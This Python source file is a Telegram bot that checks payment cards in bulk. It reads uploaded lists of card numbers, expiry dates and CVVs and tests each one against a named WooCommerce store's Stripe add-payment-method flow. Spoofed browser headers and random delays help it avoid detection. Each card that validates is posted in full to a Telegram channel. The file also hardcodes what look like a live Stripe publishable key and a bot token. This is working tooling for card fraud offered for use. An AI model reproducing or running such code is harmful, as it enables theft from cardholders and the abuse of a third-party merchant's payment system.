import aiohttp
import asyncio
import json
import random
import os
import sys
import logging
from datetime import datetime
from telegram import Update, Bot
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from dotenv import load_dotenv

# ===================== LOGGING SETUP =====================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===================== CONFIGURATION =====================
load_dotenv()

DOMAIN = os.getenv("DOMAIN", "https://dainte.com")
PK = os.getenv("STRIPE_PK", "pk_live_51F0CDkINGBagf8ROVbhXA43bHPn9cGEHEO55TN2mfNGYsbv2DAPuv6K0LoVywNJKNuzFZ4xGw94nVElyYg1Aniaf00QDrdzPhf")
CHANNEL_ID = os.getenv("CHANNEL_ID", "-1003673366048")
BOT_TOKEN = os.getenv("BOT_TOKEN", "8569583023:AAFNKM3mkumVNrpj9uOZ-32fV3sP3nZ0TSo")  # Changed from hardcoded
ADMIN_IDS = [admin_id.strip() for admin_id in os.getenv("ADMIN_IDS", "1318826936").split(",") if admin_id.strip()]

# Global variables
bot_running = True
current_task = None
approved_cards_list = []
checking_lock = asyncio.Lock()

# ===================== UTILITY FUNCTIONS =====================

def parseX(data, start, end):
    """Safely extract text between start and end strings"""
    try:
        if start in data and end in data:
            star = data.index(start) + len(start)
            last = data.index(end, star)
            return data[star:last]
        return "None"
    except ValueError:
        return "None"
    except Exception:
        return "None"

async def make_request(
    session,
    url,
    method="POST",
    params=None,
    headers=None,
    data=None,
    json_data=None,
):
    """Make HTTP request with error handling"""
    try:
        async with session.request(
            method,
            url,
            params=params,
            headers=headers,
            data=data,
            json=json_data,
        ) as response:
            text = await response.text()
            return text, response.status
    except asyncio.TimeoutError:
        return None, 408  # Timeout
    except aiohttp.ClientError as e:
        logger.error(f"Request error: {e}")
        return None, 0
    except Exception as e:
        logger.error(f"Unexpected request error: {e}")
        return None, 0

async def validate_card_format(card_data):
    """Validate card data format"""
    parts = card_data.strip().split("|")
    if len(parts) != 4:
        return False, "Invalid format. Use: cc|mon|year|cvv"
    
    cc, mon, year, cvv = parts
    
    # Clean card number
    cc = ''.join(filter(str.isdigit, cc))
    
    if not (13 <= len(cc) <= 19):
        return False, "Invalid card number length"
    
    try:
        mon_int = int(mon)
        if not (1 <= mon_int <= 12):
            return False, "Invalid month (1-12)"
        
        year_int = int(year)
        if len(str(year_int)) not in [2, 4]:
            return False, "Invalid year format"
            
        cvv_int = int(cvv)
        if not (3 <= len(cvv) <= 4):
            return False, "Invalid CVV length"
            
        return True, (cc, str(mon_int).zfill(2), str(year_int)[-2:], cvv)
    except ValueError:
        return False, "Invalid numeric values"

# ===================== CARD CHECKING FUNCTION =====================

async def check_card(card_data, card_num, total_cards, user_id=None, username=None):
    """Main card checking function"""
    try:
        # Validate card format
        is_valid, validation_result = await validate_card_format(card_data)
        if not is_valid:
            return f"❌ [{card_num}/{total_cards}] {validation_result}"
        
        cc, mon, year, cvv = validation_result
        original_card = f"{cc}|{mon}|{year}|{cvv}"
        
        # Prepare cookies (simplified version)
        cookies = {
            '_ga': 'GA1.1.1266478631.1765951325',
            '__stripe_mid': f"mid_{random.randint(100000, 999999)}",
            '__stripe_sid': f"sid_{random.randint(100000, 999999)}",
        }

        connector = aiohttp.TCPConnector(limit=50, ssl=False)
        timeout = aiohttp.ClientTimeout(total=30)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            cookies=cookies
        ) as session:

            # Step 1: Get the payment method page
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Cache-Control": "max-age=0",
            }

            req, status = await make_request(
                session,
                url=f"{DOMAIN}/my-account/add-payment-method/",
                method="GET",
                headers=headers,
            )
            
            if req is None:
                return f"❌ [{card_num}/{total_cards}] Failed to get payment page"
            
            setup_intent_nonce = parseX(req, '"createAndConfirmSetupIntentNonce":"', '"')
            if setup_intent_nonce == "None":
                # Try alternative pattern
                setup_intent_nonce = parseX(req, 'nonce":"', '"')
            
            if setup_intent_nonce == "None":
                return f"❌ [{card_num}/{total_cards}] No setup intent nonce found"

            await asyncio.sleep(random.uniform(1, 3))

            # Step 2: Create payment method with Stripe
            headers2 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://js.stripe.com",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            }

            data2 = {
                "type": "card",
                "card[number]": cc,
                "card[cvc]": cvv,
                "card[exp_year]": year,
                "card[exp_month]": mon,
                "billing_details[address][postal_code]": "10001",
                "billing_details[address][country]": "US",
                "billing_details[name]": "John Smith",
                "key": PK,
            }

            req2, status2 = await make_request(
                session,
                "https://api.stripe.com/v1/payment_methods",
                headers=headers2,
                data=data2,
            )
            
            if req2 is None:
                return f"❌ [{card_num}/{total_cards}] Stripe request failed"
                
            try:
                pm_data = json.loads(req2)
                if 'error' in pm_data:
                    error_msg = pm_data['error'].get('message', 'Unknown error')
                    return f"❌ [{card_num}/{total_cards}] Stripe: {error_msg}"
                
                pmid = pm_data.get('id')
                if not pmid:
                    return f"❌ [{card_num}/{total_cards}] No payment method ID"
                    
            except json.JSONDecodeError:
                return f"❌ [{card_num}/{total_cards}] Invalid Stripe response"

            await asyncio.sleep(random.uniform(1, 2))

            # Step 3: Send to WooCommerce
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Referer": f"{DOMAIN}/my-account/add-payment-method/",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            }

            data3 = {
                "action": "wc_stripe_create_and_confirm_setup_intent",
                "wc-stripe-payment-method": pmid,
                "wc-stripe-payment-type": "card",
                "_ajax_nonce": setup_intent_nonce,
            }

            req3, status3 = await make_request(
                session,
                url=f"{DOMAIN}/wp-admin/admin-ajax.php",
                headers=headers3,
                data=data3,
            )
            
            if req3:
                try:
                    result_data = json.loads(req3)
                    if result_data.get('success'):
                        # ✅ APPROVED CARD
                        result_message = f"✅ APPROVED [{card_num}/{total_cards}]\nCC: {cc}|{mon}|{year}|{cvv}"
                        
                        # Store approved card
                        card_info = {
                            "card": original_card,
                            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                            "user_id": user_id,
                            "username": username,
                            "card_num": card_num,
                            "total_cards": total_cards
                        }
                        
                        async with checking_lock:
                            approved_cards_list.append(card_info)
                        
                        logger.info(f"Approved card: {original_card}")
                        return result_message
                    else:
                        error_msg = "Declined"
                        if 'data' in result_data and 'error' in result_data['data']:
                            error_msg = result_data['data']['error'].get('message', 'Declined')
                        
                        return f"❌ DECLINED [{card_num}/{total_cards}]\nCC: {cc}|{mon}|{year}|{cvv}\nReason: {error_msg}"
                        
                except json.JSONDecodeError:
                    return f"❌ ERROR [{card_num}/{total_cards}]\nCC: {cc}|{mon}|{year}|{cvv}\nInvalid response"
            
            return f"❌ FAILED [{card_num}/{total_cards}]\nCC: {cc}|{mon}|{year}|{cvv}\nNo server response"
            
    except Exception as e:
        logger.error(f"Card checking error: {e}")
        return f"❌ ERROR [{card_num}/{total_cards}]\n{str(e)[:100]}"

# ===================== CHANNEL POSTING FUNCTIONS =====================

async def post_to_channel(bot: Bot, card_info):
    """Post approved card to Telegram channel"""
    try:
        message = (
            f"🎉 **NEW APPROVED CARD** 🎉\n\n"
            f"💳 `{card_info['card']}`\n"
            f"⏰ {card_info['timestamp']}\n"
            f"📊 Progress: {card_info['card_num']}/{card_info['total_cards']}\n"
        )
        
        if card_info.get('username'):
            message += f"👤 Checked by: @{card_info['username']}"
        
        await bot.send_message(
            chat_id=CHANNEL_ID,
            text=message,
            parse_mode="Markdown"
        )
        logger.info(f"Posted to channel: {card_info['card']}")
        return True
    except Exception as e:
        logger.error(f"Failed to post to channel: {e}")
        return False

async def post_batch_to_channel(bot: Bot, cards_batch, batch_number):
    """Post multiple approved cards as a batch"""
    try:
        if not cards_batch:
            return False
        
        batch_message = f"📦 **BATCH #{batch_number}**\n\n"
        
        for i, card_info in enumerate(cards_batch, 1):
            batch_message += f"{i}. `{card_info['card']}`\n"
            batch_message += f"   ⏰ {card_info['timestamp']}\n"
            if card_info.get('username'):
                batch_message += f"   👤 @{card_info['username']}\n"
        
        batch_message += f"\n✅ Total: {len(cards_batch)} cards"
        
        await bot.send_message(
            chat_id=CHANNEL_ID,
            text=batch_message,
            parse_mode="Markdown"
        )
        logger.info(f"Batch #{batch_number} posted with {len(cards_batch)} cards")
        return True
    except Exception as e:
        logger.error(f"Failed to post batch: {e}")
        return False

# ===================== TELEGRAM BOT FUNCTIONS =====================

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    global bot_running
    bot_running = True
    
    user_id = update.effective_user.id
    username = update.effective_user.username or "N/A"
    
    welcome_text = (
        f"Send File Now"
    )
    await update.message.reply_text(welcome_text)
    
    logger.info(f"User @{username} (ID: {user_id}) started bot")

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /stop command"""
    global bot_running
    
    if not bot_running:
        await update.message.reply_text("⚠️ Bot is not running.")
        return
    
    bot_running = False
    await update.message.reply_text("🛑 **Checking stopped!**\nUse /start to restart.")
    logger.info("Checking stopped by user")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /status command"""
    global bot_running, approved_cards_list
    
    status_text = "🟢 Bot running" if bot_running else "🔴 Bot stopped"
    
    status_message = (
        f"📊 **Bot Status**\n"
        f"{status_text}\n"
        f"📈 Approved cards waiting: {len(approved_cards_list)}\n\n"
        f"🔸 **Commands:**\n"
        f"/start - Start bot\n"
        f"/stop - Stop checking\n"
        f"/status - This page\n"
        f"/postnow - Post to channel (Admin)"
    )
    
    await update.message.reply_text(status_message)

async def postnow_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /postnow command"""
    user_id = str(update.effective_user.id)
    
    # Check admin access
    if ADMIN_IDS and user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only command.")
        return
    
    global approved_cards_list
    
    if not approved_cards_list:
        await update.message.reply_text("ℹ️ No approved cards to post.")
        return
    
    await update.message.reply_text(f"📤 Posting {len(approved_cards_list)} cards to channel...")
    
    posted_count = 0
    bot = context.bot
    
    # Post in batches of 5
    cards_to_post = approved_cards_list.copy()
    
    for i in range(0, len(cards_to_post), 5):
        batch = cards_to_post[i:i+5]
        if await post_batch_to_channel(bot, batch, i//5 + 1):
            posted_count += len(batch)
        await asyncio.sleep(1)
    
    # Remove posted cards
    async with checking_lock:
        approved_cards_list = [card for card in approved_cards_list if card not in cards_to_post]
    
    await update.message.reply_text(f"✅ {posted_count} cards posted to channel.")

async def handle_text_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle incoming text files"""
    global bot_running
    
    if not bot_running:
        await update.message.reply_text("⚠️ Bot stopped. Use /start to restart.")
        return
    
    user_id = update.effective_user.id
    username = update.effective_user.username or "N/A"
    
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Send .txt file only")
        return
    
    await update.message.reply_text("📥 File received, checking...")
    
    # Download file
    try:
        file = await document.get_file()
        temp_file = f"temp_{user_id}_{int(datetime.now().timestamp())}.txt"
        await file.download_to_drive(temp_file)
        
        with open(temp_file, 'r', encoding='utf-8', errors='ignore') as f:
            cards = [line.strip() for line in f if line.strip()]
        
        if not cards:
            await update.message.reply_text("❌ Empty or invalid file")
            return
        
        total_cards = len(cards)
        await update.message.reply_text(
            f"🔍 **Checking Started**\n"
            f"👤 User: @{username}\n"
            f"📊 Cards: {total_cards}\n"
            f"⏳ Please wait...\n\n"
            f"🛑 Stop with /stop"
        )
        
        approved = 0
        declined = 0
        results = []
        last_update = 0
        
        bot_instance = context.bot
        
        for i, card in enumerate(cards, 1):
            if not bot_running:
                await update.message.reply_text(
                    f"🛑 **Stopped!**\n"
                    f"Checked: {i-1}/{total_cards}\n"
                    f"✅ Approved: {approved}\n"
                    f"❌ Declined: {declined}"
                )
                break
            
            try:
                result = await check_card(card, i, total_cards, user_id, username)
                results.append(result)
                
                if "✅ APPROVED" in result:
                    approved += 1
                    # Post immediately
                    if approved_cards_list:
                        last_card = approved_cards_list[-1]
                        await post_to_channel(bot_instance, last_card)
                else:
                    declined += 1
                
                # Progress update every 5 cards or last card
                if i % 5 == 0 or i == total_cards:
                    progress_msg = (
                        f"📊 Progress: {i}/{total_cards}\n"
                        f"✅ Approved: {approved} | ❌ Declined: {declined}"
                    )
                    await update.message.reply_text(progress_msg)
                    
                    # Show last 3 results
                    if results[-3:]:
                        await update.message.reply_text('\n'.join(results[-3:]))
                
                # Delay between cards
                if i < total_cards:
                    await asyncio.sleep(random.uniform(8, 12))
                    
            except Exception as e:
                error_result = f"❌ Error [{i}/{total_cards}]\n{str(e)}"
                results.append(error_result)
                declined += 1
        
        # Final summary
        if bot_running:
            summary = [
                "🎯 **Check Completed**",
                f"📊 Total: {total_cards}",
                f"✅ Approved: {approved}",
                f"❌ Declined: {declined}",
            ]
            
            if total_cards > 0:
                success_rate = (approved/total_cards)*100
                summary.append(f"📈 Success rate: {success_rate:.1f}%")
            
            await update.message.reply_text('\n'.join(summary))
        
    except Exception as e:
        logger.error(f"File handling error: {e}")
        await update.message.reply_text(f"❌ Error: {str(e)}")
    finally:
        # Cleanup
        if 'temp_file' in locals() and os.path.exists(temp_file):
            try:
                os.remove(temp_file)
            except:
                pass

# ===================== MAIN FUNCTION =====================

def main():
    """Main function"""
    # Get configuration
    if not BOT_TOKEN:
        logger.error("❌ BOT_TOKEN not set in environment!")
        print("Please set BOT_TOKEN in environment variables or .env file")
        sys.exit(1)
    
    logger.info(f"🤖 Starting Telegram Bot...")
    logger.info(f"📢 Channel: {CHANNEL_ID}")
    logger.info(f"👑 Admin IDs: {ADMIN_IDS}")
    logger.info("=" * 40)
    
    try:
        # Create application
        app = Application.builder().token(BOT_TOKEN).build()
        
        # Add handlers
        app.add_handler(CommandHandler("start", start_command))
        app.add_handler(CommandHandler("stop", stop_command))
        app.add_handler(CommandHandler("status", status_command))
        app.add_handler(CommandHandler("postnow", postnow_command))
        app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_text_file))
        
        # Start bot
        logger.info("✅ Bot is running...")
        print("📋 Available commands:")
        print("  /start    - Start the bot")
        print("  /stop     - Stop current checking")
        print("  /status   - Check bot status")
        print("  /postnow  - Post approved cards to channel")
        print("=" * 40)
        
        # Run bot
        app.run_polling(allowed_updates=Update.ALL_TYPES)
        
    except Exception as e:
        logger.error(f"❌ Bot error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
